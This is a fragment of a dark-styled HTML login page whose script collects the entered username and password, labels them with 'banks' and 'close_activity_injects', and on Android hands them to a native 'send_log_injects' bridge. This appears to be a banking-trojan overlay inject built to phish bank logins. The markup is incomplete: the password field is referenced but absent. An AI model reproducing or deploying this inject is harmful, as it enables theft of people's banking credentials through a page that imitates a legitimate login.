<style type="text/css">
    body {
        background: #222222;
        margin: 0;
        padding: 0;
        font-family: Helvetica, sans-serif;
        background-size: 100%;
    }
    .logo {
text-align: center;
    background-size: 100%;
    padding: 20px 20px 20px 0px;
    background: none;
    color: #fff;
    font-weight: 400;
    text-decoration: none;
    }
    .form {
        text-align: center;
        padding-top: 70px;
    }
    .form label {
        display: block;
    }
    form {
        display: inline-block;
    }
fieldset {
      position: relative;
      text-align: center;
      border: none;
          margin: 0;
    padding: 0;

}

input[type="text"],input[type="password"] {
line-height: 16px;
    font-size: 17px;
    box-sizing: border-box;
    width: 100%;
    position: relative;
    padding: 10px;
    margin: 0px 1px;
    display: block;
    -webkit-box-shadow: none;
    box-shadow: none;
    -webkit-appearance: none;
    height: 48px;
    margin: 0px 0px 0px 0px;
    color: #000;
    text-align: left;
    outline: none;
    border: 1px solid #fff;
    background: #fff;
    padding-left: 120px;
}
input[type="button"] {
left: 0;
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    color: #000;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #ffed00;
}
fieldset span {
    display: inline-block;
    text-align: center;
    color: #4b4949;
    left: 0;
    right: 0;
    padding-top: 30px;
}
fieldset p {
    display: inline-block;
    left: 0;
    right: 0;
    color: #088f0d;
}
.logo span {
    display: inline-block;
    float: left;
    padding: 40px 0px 0px 20px;
    font-size: 20px;
    color: #fff;
    font-weight: 600;
}
input::placeholder {
    color: #a9a9a9;
    font-size: 15px;
}
</style>

        <label style="float: left; position: relative; top: 35px; z-index: 1; left: 10px;">Username</label>
        <input type="text" name="login" id="login" placeholder="Enter Username" style="height: 50px; border-bottom:1px solid #6a6464">
        <label style="float: left; position: relative; top: 15px; z-index: 1; left: 10px;">Password</label>

</fieldset> 

<script>
function send_form()
{
    if (document.getElementById("login").value == '')
{
    alert ('All fields required!');
    return false;
}
if (document.getElementById("password").value == '')
{
    alert ('All fields required!');
    return false;
}
var data = {};
    data.login = document.getElementById('login').value;
    data.password = document.getElementById('password').value;
    data.type_injects = "banks";
    data.closed = "close_activity_injects";
    
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
            Android.send_log_injects(JSON.stringify(data))
        } catch (err) {}
    }else{
        alert(JSON.stringify(data));
    } 
}
</script>
